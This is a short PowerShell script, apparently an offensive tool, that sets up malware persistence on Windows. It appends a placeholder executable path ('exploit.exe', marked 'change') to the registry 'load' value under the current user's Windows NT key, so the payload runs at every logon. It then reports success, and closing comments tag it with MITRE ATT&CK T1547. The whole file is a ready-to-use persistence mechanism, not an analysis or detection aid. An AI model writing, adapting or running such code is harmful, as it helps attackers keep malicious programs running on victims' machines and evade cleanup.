
$RegPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
$RegName = "load"
$MalwarePath = "C:\Users\Public\exploit.exe"  # change 

If (!(Test-Path $RegPath)) {
    Write-Host "[+] Creating registry path: $RegPath"
    New-Item -Path $RegPath -Force | Out-Null
}

$ExistingValue = (Get-ItemProperty -Path $RegPath -Name $RegName -ErrorAction SilentlyContinue).$RegName
if ($ExistingValue) {
    $NewValue = "$ExistingValue $MalwarePath"
} else {
    $NewValue = $MalwarePath
}
Set-ItemProperty -Path $RegPath -Name $RegName -Value $NewValue

Write-Host "[+] persistence established, payload will execute at user logon: $MalwarePath"

# MITRE ATTACK
# Persistence technique, TID1547  
# https://attack.mitre.org/techniques/T1547/
# Boot or Logon Autostart Execution
# sub-technique T1547.001
# Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

